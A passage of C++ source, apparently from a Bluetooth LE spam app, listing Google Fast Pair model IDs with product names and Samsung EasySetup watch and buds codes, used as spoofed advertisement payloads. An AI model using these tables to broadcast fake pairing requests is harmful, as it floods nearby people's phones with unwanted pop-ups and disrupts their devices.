    {0x06AE20, "Galaxy S21 5G"},
    {0x06C197, "OPPO Enco Air3 Pro"},
    {0x06C95C, "Sony WH-1000XM2"},
    {0x06D8FC, "soundcore Liberty 4 NC"},
    {0x0744B6, "Technics EAH-AZ60M2"},
    {0x07A41C, "WF-C700N"},
    {0x07C95C, "Sony WH-1000XM2"},
    {0x07F426, "Nest Hub Max"},
    {0x0102F0, "JBL Everest 110GA - Gun Metal"},
    {0x0202F0, "JBL Everest 110GA - Silver"},
    {0x0302F0, "JBL Everest 310GA - Brown"},
    {0x0402F0, "JBL Everest 310GA - Gun Metal"},
    {0x0502F0, "JBL Everest 310GA - Silver"},
    {0x0702F0, "JBL Everest 710GA - Gun Metal"},
    {0x0802F0, "JBL Everest 710GA - Silver"},
    {0x054B2D, "JBL TUNE125TWS"},
    {0x0660D7, "JBL LIVE770NC"},
    {0x0103F0, "LG HBS-835"},
    {0x0203F0, "LG HBS-830"},
    {0x0303F0, "LG HBS-930"},
    {0x0403F0, "LG HBS-1010"},
    {0x0503F0, "LG HBS-1500"},
    {0x0703F0, "LG HBS-1120"},
    {0x0803F0, "LG HBS-1125"},
    {0x0903F0, "LG HBS-2000"},
    {0x0102F0, "JBL Everest 110GA"},
    {0x0202F0, "JBL Everest 110GA"},
    {0x0302F0, "JBL Everest 310GA"},
    {0x0402F0, "JBL Everest 310GA"},
    {0x0502F0, "JBL Everest 310GA"},
    {0x060000, "Google Pixel Buds"},
    {0x070000, "Android Auto"},
    {0x0702F0, "JBL Everest 710GA"},
    {0x071C74, "JBL Flip 6"},
    {0x080000, "Foocorp Foophones"},
    {0x0802F0, "JBL Everest 710GA"},
    {0x090000, "Test Android TV"},
    {0x0A0000, "Test 00000a - Anti-Spoofing"},
    {0x0B0000, "Google Gphones"},
    {0x0C0000, "Google Gphones"},
    {0x0DC6BF, "My Awesome Device II"},
    {0x0DC95C, "Sony WH-1000XM3"},
    {0x0DEC2B, "Emporio Armani EA Connected"},
    {0x0E138D, "WF-SP800N"},
    {0x0EC95C, "Sony WI-C600N"},
    {0x0ECE95, "Philips TAT3508"},
    {0x0F0993, "COUMI TWS-834A"},
    {0x0F1B8D, "JBL VIBE BEAM"},
    {0x0F232A, "JBL TUNE BUDS"},
    {0x0F2D16, "WH-CH520"},
    {0x20A19B, "WF-SP800N"},
    {0x20C95C, "Sony WF-SP700N"},
    {0x20CC2C, "SRS-XB43"},
    {0x213C8C, "DIZO Wireless Power"},
    {0x21521D, "boAt Rockerz 355 (Green)"},
    {0x21A04E, "oraimo FreePods Pro"},
    {0x2D7A23, "WF-1000XM4"},
    {0x350000, "Test 000035"},
    {0x470000, "Arduino 101"},
    {0x480000, "Fast Pair Headphones"},
    {0x490000, "Fast Pair Headphones"},
    {0x5BA9B5, "WF-SP800N"},
    {0x5BACD6, "Bose QC Ultra Earbuds"},
    {0x5BD6C9, "JBL TUNE225TWS"},
    {0x5BE3D4, "JBL Flip 6"},
    {0x5C0206, "UA | JBL TWS STREAK"},
    {0x5C0C84, "JBL TUNE225TWS"},
    {0x5C4833, "WH-CH720N"},
    {0x5C4A7E, "LG HBS-XL7"},
    {0x5C55E7, "TCL MOVEAUDIO S200"},
    {0x5C7CDC, "WH-1000XM5"},
    {0x5C8AA5, "JBL LIVE220BT"},
    {0x5CC900, "Sony WF-1000X"},
    {0x5CC901, "Sony WF-1000X"},
    {0x5CC902, "Sony WH-1000XM2"},
    {0x5CC903, "Sony WH-1000XM2"},
    {0x5CC904, "Sony WI-1000X"},
    {0x5CC905, "Sony WI-1000X"},
    {0x5CC906, "Sony WH-1000XM2"},
    {0x5CC907, "Sony WH-1000XM2"},
    {0x5CC908, "Sony WI-1000X"},
    {0x5CC909, "Sony WI-1000X"},
    {0x5CC90A, "Sony WH-1000XM3"},
    {0x5CC90B, "Sony WH-1000XM3"},
    {0x5CC90C, "Sony WH-1000XM3"},
    {0x5CC90D, "Sony WH-1000XM3"},
    {0x5CC90E, "Sony WI-C600N"},
    {0x5CC90F, "Sony WI-C600N"},
    {0x5CC910, "Sony WI-C600N"},
    {0x5CC911, "Sony WI-C600N"},
    {0x5CC912, "Sony WI-C600N"},
    {0x5CC913, "Sony WI-C600N"},
    {0x5CC914, "Sony WI-SP600N"},
    {0x5CC915, "Sony WI-SP600N"},
    {0x5CC916, "Sony WI-SP600N"},
    {0x5CC917, "Sony WI-SP600N"},
    {0x5CC918, "Sony WI-SP600N"},
    {0x5CC919, "Sony WI-SP600N"},
    {0x5CC91A, "Sony WI-SP600N"},
    {0x5CC91B, "Sony WI-SP600N"},
    {0x5CC91C, "Sony WI-SP600N"},
    {0x5CC91D, "Sony WI-SP600N"},
    {0x5CC91E, "Sony WF-SP700N"},
    {0x5CC91F, "Sony WF-SP700N"},
    {0x5CC920, "Sony WF-SP700N"},
    {0x5CC921, "Sony WF-SP700N"},
    {0x5CC922, "Sony WF-SP700N"},
    {0x5CC923, "Sony WF-SP700N"},
    {0x5CC924, "Sony WF-SP700N"},
    {0x5CC925, "Sony WF-SP700N"},
    {0x5CC926, "Sony WF-SP700N"},
    {0x5CC927, "Sony WF-SP700N"},
    {0x5CC928, "Sony WH-H900N"},
    {0x5CC929, "Sony WH-H900N"},
    {0x5CC92A, "Sony WH-H900N"},
    {0x5CC92B, "Sony WH-H900N"},
    {0x5CC92C, "Sony WH-H900N"},
    {0x5CC92D, "Sony WH-H900N"},
    {0x5CC92E, "Sony WH-H900N"},
    {0x5CC92F, "Sony WH-H900N"},
    {0x5CC930, "Sony WH-H900N"},
    {0x5CC931, "Sony WH-H900N"},
    {0x5CC932, "Sony WH-CH700N"},
    {0x5CC933, "Sony WH-CH700N"},
    {0x5CC934, "Sony WH-CH700N"},
    {0x5CC935, "Sony WH-CH700N"},
    {0x5CC936, "Sony WH-CH700N"},
    {0x5CC937, "Sony WH-CH700N"},
    {0x5CC938, "Sony WF-1000XM3"},
    {0x5CC939, "Sony WF-1000XM3"},
    {0x5CC93A, "Sony WF-1000XM3"},
    {0x5CC93B, "Sony WF-1000XM3"},
    {0x5CC93C, "Sony WH-XB700"},
    {0x5CC93D, "Sony WH-XB700"},
    {0x5CC93E, "Sony WH-XB700"},
    {0x5CC93F, "Sony WH-XB700"},
    {0x5CC940, "Sony WH-XB900N"},
    {0x5CC941, "Sony WH-XB900N"},
    {0x5CC942, "Sony WH-XB900N"},
    {0x5CC943, "Sony WH-XB900N"},
    {0x5CC944, "Sony WH-XB900N"},
    {0x5CC945, "Sony WH-XB900N"},
    {0x5CEE3C, "Fitbit Charge 4"},
    {0x6AD226, "TicWatch Pro 3"},
    {0x6B1C64, "Pixel Buds"},
    {0x6B8C65, "oraimo FreePods 4"},
    {0x6B9304, "Nokia SB-101"},
    {0x6BA5C3, "Jabra Elite 4"},
    {0x6C42C0, "TWS05"},
    {0x6C4DE5, "JBL LIVE PRO 2 TWS"},
    {0x718FA4, "JBL LIVE300TWS"},
    {0x89BAD5, "Galaxy A23 5G"},
    {0x8A31B7, "Bose QC Ultra Headphones"},
    {0x8A3D00, "Cleer FLOW Ⅱ"},
    {0x8A3D01, "Cleer EDGE Voice"},
    {0x8A8F23, "WF-1000XM5"},
    {0x8AADAE, "JLab GO Work 2"},
    {0x8B0A91, "Jabra Elite 5"},
    {0x8B5A7B, "TicWatch Pro 3 GPS"},
    {0x8B66AB, "Pixel Buds A-Series"},
    {0x8BB0A0, "Nokia Solo Bud+"},
    {0x8BF79A, "Oladance Whisper E1"},
    {0x8C07D2, "Jabra Elite 4 Active"},
    {0x8C1706, "YY7861E"},
    {0x8C4236, "GLIDiC mameBuds"},
    {0x8C6B6A, "realme Buds Air 3S"},
    {0x8CAD81, "KENWOOD WS-A1"},
    {0x8CB05C, "JBL LIVE PRO+ TWS"},
    {0x8CD10F, "realme Buds Air Pro"},
    {0x8D13B9, "BLE-TWS"},
    {0x8D16EA, "Galaxy M14 5G"},
    {0x8D5B67, "Pixel 90c"},
    {0x8E14D7, "LG-TONE-TFP8"},
    {0x8E1996, "Galaxy A24 5g"},
    {0x8E4666, "Oladance Wearable Stereo"},
    {0x8E5550, "boAt Airdopes 511v2"},
    {0x9101F0, "Jabra Elite 2"},
    {0x9128CB, "TCL MOVEAUDIO Neo"},
    {0x913B0C, "YH-E700B"},
    {0x915CFA, "Galaxy A14"},
    {0x9171BE, "Jabra Evolve2 65 Flex"},
    {0x917E46, "LinkBuds"},
    {0x91AA00, "Beoplay E8 2.0"},
    {0x91AA01, "Beoplay H9 3rd Generation"},
    {0x91AA02, "B&O Earset"},
    {0x91AA03, "B&O Beoplay H8i"},
    {0x91AA04, "Beoplay H4"},
    {0x91AA05, "B&O Beoplay E6"},
    {0x91BD38, "LG HBS-FL7"},
    {0x91C813, "JBL TUNE770NC"},
    {0x91DABC, "SRS-XB33"},
    {0x92255E, "LG-TONE-FP6"},
    {0x989D0A, "Set up your new Pixel 2"},
    {0x9939BC, "ATH-SQ1TW"},
    {0x994374, "EDIFIER W320TN"},
    {0x997B4A, "UA | JBL True Wireless Flash X"},
    {0x99C87B, "WH-H810 (h.ear)"},
    {0x99D7EA, "oraimo OpenCirclet"},
    {0x99F098, "Galaxy S22 Ultra"},
    {0x9A408A, "MOTO BUDS 065"},
    {0x9A9BDD, "WH-XB910N"},
    {0x9ADB11, "Pixel Buds Pro"},
    {0x9AEEA4, "LG HBS-FN4"},
    {0x9B7339, "AKG N9 Hybrid"},
    {0x9B735A, "JBL RFL FLOW PRO"},
    {0x9B9872, "Hyundai"},
    {0x9BC64D, "JBL TUNE225TWS"},
    {0x9BE931, "WI-C100"},
    {0x9C0AF7, "JBL VIBE BUDS"},
    {0x9C3997, "ATH-M50xBT2"},
    {0x9C4058, "JBL WAVE FLEX"},
    {0x9C6BC0, "LinkBuds S"},
    {0x9C888B, "WH-H910N (h.ear)"},
    {0x9C98DB, "JBL TUNE225TWS"},
    {0x9CA277, "YY2963"},
    {0x9CB5F3, "WH-1000XM5"},
    {0x9CB881, "soundcore Motion 300"},
    {0x9CD0F3, "LG HBS-TFN7"},
    {0x9CE3C7, "EDIFIER NeoBuds Pro 2"},
    {0x9CEFD1, "SRS-XG500"},
    {0x9CF08F, "JLab Epic Air ANC"},
    {0x9D00A6, "Urbanears Juno"},
    {0x9D7D42, "Galaxy S20"},
    {0x9DB896, "Your BMW"},
    {0xA7E52B, "Bose NC 700 Headphones"},
    {0xA7EF76, "JBL CLUB PRO+ TWS"},
    {0xA8001A, "JBL CLUB ONE"},
    {0xA83C10, "adidas Z.N.E. 01"},
    {0xA8658F, "ROCKSTER GO"},
    {0xA8845A, "oraimo FreePods 4"},
    {0xA88B69, "WF-SP800N"},
    {0xA8A00E, "Nokia CB-201"},
    {0xA8A72A, "JBL LIVE670NC"},
    {0xA8C636, "JBL TUNE660NC"},
    {0xA8CAAD, "Galaxy F04"},
    {0xA8E353, "JBL TUNE BEAM"},
    {0xA8F96D, "JBL ENDURANCE RUN 2 WIRELESS"},
    {0xA90358, "JBL LIVE220BT"},
    {0xA92498, "JBL WAVE BUDS"},
    {0xA9394A, "JBL TUNE230NC TWS"},
    {0xC6936A, "JBL LIVE PRO+ TWS"},
    {0xC69AFD, "WF-H800 (h.ear)"},
    {0xC6ABEA, "UA | JBL True Wireless Flash X"},
    {0xC6EC5F, "SRS-XE300"},
    {0xC7736C, "Philips PH805"},
    {0xC79B91, "Jabra Evolve2 75"},
    {0xC7A267, "Fake Test Mouse"},
    {0xC7D620, "JBL Pulse 5"},
    {0xC7FBCC, "JBL VIBE FLEX"},
    {0xC8162A, "LinkBuds S"},
    {0xC85D7A, "JBL ENDURANCE PEAK II"},
    {0xC8777E, "Jaybird Vista 2"},
    {0xC878AA, "SRS-XV800"},
    {0xC8C641, "Redmi Buds 4 Lite"},
    {0xC8D335, "WF-1000XM4"},
    {0xC8E228, "Pixel Buds Pro"},
    {0xC9186B, "WF-1000XM4"},
    {0xC9836A, "JBL Xtreme 4"},
    {0xCA7030, "ATH-TWX7"},
    {0xCAB6B8, "ATH-M20xBT"},
    {0xCAF511, "Jaybird Vista 2"},
    {0xCB093B, "Urbanears Juno"},
    {0xCB529D, "soundcore Glow"},
    {0xCC438E, "WH-1000XM4"},
    {0xCC5F29, "JBL TUNE660NC"},
    {0xCC754F, "YY2963"},
    {0xCC93A5, "Sync"},
    {0xCCBB7E, "MIDDLETON"},
    {0xCD8256, "Bose NC 700 Headphones"},
    {0xD446A7, "WH-1000XM5"},
    {0xD5A59E, "Jabra Elite Speaker"},
    {0xD5B5F7, "MOTO BUDS 600 ANC"},
    {0xD5C6CE, "realme TechLife Buds T100"},
    {0xD654CD, "JBL Xtreme 4"},
    {0xD65F4E, "Philips Fidelio T2"},
    {0xD69B2B, "TONE-T80S"},
    {0xD6C195, "LG HBS-SL5"},
    {0xD6E870, "Beoplay EX"},
    {0xD6EE84, "Rockerz 255 Max"},
    {0xD7102F, "ATH-SQ1TW SVN"},
    {0xD7E3EB, "Cleer HALO"},
    {0xD8058C, "MOTIF II A.N.C."},
    {0xD820EA, "WH-XB910N"},
    {0xD87A3E, "Pixel Buds Pro"},
    {0xD8F3BA, "WH-1000XM5"},
    {0xD8F4E8, "realme Buds T100"},
    {0xD90617, "Redmi Buds 4 Active"},
    {0xD933A7, "JBL ENDURANCE PEAK 3"},
    {0xD9414F, "JBL SOUNDGEAR SENSE"},
    {0xD97EBA, "JBL TUNE125TWS"},
    {0xD9964B, "JBL TUNE670NC"},
    {0xDA0F83, "SPACE"},
    {0xDA4577, "Jabra Elite 4 Active"},
    {0xDA5200, "blackbox TRIP II"},
    {0xDAD3A6, "Jabra Elite 10"},
    {0xDADE43, "Chromebox"},
    {0xDAE096, "adidas RPT-02 SOL"},
    {0xDB8AC7, "LG TONE-FREE"},
    {0xDBE5B1, "WF-1000XM4"},
    {0xDC5249, "WH-H810 (h.ear)"},
    {0xDCF33C, "JBL REFLECT MINI NC"},
    {0xDD4EC0, "OPPO Enco Air3 Pro"},
    {0xDE215D, "WF-C500"},
    {0xDE577F, "Teufel AIRY TWS 2"},
    {0xDEC04C, "SUMMIT"},
    {0xDEDD6F, "soundcore Space One"},
    {0xDEE8C0, "Ear (2)"},
    {0xDEEA86, "Xiaomi Buds 4 Pro"},
    {0xDEF234, "WH-H810 (h.ear)"},
    {0xDF01E3, "Sync"},
    {0xDF271C, "Big Bang e Gen 3"},
    {0xDF42DE, "TAG Heuer Calibre E4 42mm"},
    {0xDF4B02, "SRS-XB13"},
    {0xDF9BA4, "Bose NC 700 Headphones"},
    {0xDFD433, "JBL REFLECT AERO"},
    {0xE020C1, "soundcore Motion 300"},
    {0xE06116, "LinkBuds S"},
    {0xE07634, "OnePlus Buds Z"},
    {0xE09172, "JBL TUNE BEAM"},
    {0xE4E457, "Galaxy S20 5G"},
    {0xE5440B, "TAG Heuer Calibre E4 45mm"},
    {0xE57363, "Oladance Wearable Stereo"},
    {0xE57B57, "Super Device"},
    {0xE5B4B0, "WF-1000XM5"},
    {0xE5B91B, "SRS-XB33"},
    {0xE5E2E9, "Zone Wireless 2"},
    {0xE64613, "JBL WAVE BEAM"},
    {0xE64CC6, "Set up your new Pixel 3 XL"},
    {0xE69877, "JBL REFLECT AERO"},
    {0xE6E37E, "realme Buds  Air 5 Pro"},
    {0xE6E771, "ATH-CKS50TW"},
    {0xE6E8B8, "POCO Pods"},
    {0xE750CE, "Jabra Evolve2 75"},
    {0xF52494, "JBL LIVE PRO+ TWS"},
    {0x000006, "Google Pixel Buds"},
    {0x00000A, "Test 00000a - Anti-Spoofing"},
    {0x00000C, "Google Gphones"},
    {0x000049, "Fast Pair Headphones"},
    {0x003001, "Libratone Q Adapt On-Ear"},
    {0x003D8A, "Cleer FLOW Ⅱ"},
    {0x0052DA, "blackbox TRIP II"},
    {0x109201, "Beoplay H9 3rd Generation"},
    {0x124366, "BLE-Phone"},
    {0x126644, "WH-1000XM4"},
    {0x284500, "Plantronics PLT_K2"},
    {0x532011, "Big Bang e Gen 3"},
    {0x549547, "JBL WAVE BUDS"},
    {0x567679, "Pixel Buds Pro"},
    {0x575836, "Sony WI-1000X"},
    {0x596007, "MOTIF II A.N.C."},
    {0x612907, "Redmi Buds 4 Lite"},
    {0x614199, "Oraimo FreePods Pro"},
    {0x625740, "LG-TONE-NP3"},
    {0x641372, "Sony WI-1000X"},
    {0x641630, "boAt Airdopes 452"},
    {0x664454, "JBL TUNE 520BT"},
    {0x706908, "Sony WH-1000XM3"},
    {0x837980, "Sony WH-1000XM3"},
    {0x855347, "NIRVANA NEBULA"},
    {0x861698, "LinkBuds"},
    {0xCB2FE7, "soundcore Motion X500"},

};
const uint16_t BLESpamView::fastpairModels_count = COUNT_OF(fastpairModels);
// easysetup
const BLESpamView::easyU8 BLESpamView::watch_models[] = {
    {0x1A},  //, "Fallback Watch"
    {0x01},  //, "White Watch4 Classic 44m"
    {0x02},  //, "Black Watch4 Classic 40m"
    {0x03},  //, "White Watch4 Classic 40m"
    {0x04},  //, "Black Watch4 44mm"
    {0x05},  //, "Silver Watch4 44mm"
    {0x06},  //, "Green Watch4 44mm"
    {0x07},  //, "Black Watch4 40mm"
    {0x08},  //, "White Watch4 40mm"
    {0x09},  //, "Gold Watch4 40mm"
    {0x0A},  //, "French Watch4"
    {0x0B},  //, "French Watch4 Classic"
    {0x0C},  //, "Fox Watch5 44mm"
    {0x11},  //, "Black Watch5 44mm"
    {0x12},  //, "Sapphire Watch5 44mm"
    {0x13},  //, "Purpleish Watch5 40mm"
    {0x14},  //, "Gold Watch5 40mm"
    {0x15},  //, "Black Watch5 Pro 45mm"
    {0x16},  //, "Gray Watch5 Pro 45mm"
    {0x17},  //, "White Watch5 44mm"
    {0x18},  //, "White & Black Watch5"
    {0xE4},  //, "Black Watch5 Golf Edition"
    {0xE5},  //, "White Watch5 Gold Edition"
    {0x1B},  //, "Black Watch6 Pink 40mm"
    {0x1C},  //, "Gold Watch6 Gold 40mm"
    {0x1D},  //, "Silver Watch6 Cyan 44mm"
    {0x1E},  //, "Black Watch6 Classic 43m"
    {0x20},  //, "Green Watch6 Classic 43m"
    {0xEC},  //, "Black Watch6 Golf Edition"
    {0xEF},  //, "Black Watch6 TB Edition"
};
const uint8_t BLESpamView::watch_models_count = 30;
const uint8_t BLESpamView::buds_models_count = 20;
const BLESpamView::easyU32 BLESpamView::buds_models[] = {
    {0xEE7A0C},  //, "Fallback Buds"
    {0x9D1700},  //, "Fallback Dots"
    {0x39EA48},  //, "Light Purple Buds2"
    {0xA7C62C},  //, "Bluish Silver Buds2"
    {0x850116},  //, "Black Buds Live"
    {0x3D8F41},  //, "Gray & Black Buds2"
    {0x3B6D02},  //, "Bluish Chrome Buds2"
    {0xAE063C},  //, "Gray Beige Buds2"
    {0xB8B905},  //, "Pure White Buds"
    {0xEAAA17},  //, "Pure White Buds2"
    {0xD30704},  //, "Black Buds"
    {0x9DB006},  //, "French Flag Buds"
    {0x101F1A},  //, "Dark Purple Buds Live"
    {0x859608},  //, "Dark Blue Buds"
    {0x8E4503},  //, "Pink Buds"
    {0x2C6740},  //, "White & Black Buds2"
    {0x3F6718},  //, "Bronze Buds Live"
    {0x42C519},  //, "Red Buds Live"
    {0xAE073A},  //, "Black & White Buds2"
    {0x011716},  //, "Sleek Black Buds2"
};
}  // namespace ui::external_app::blespam
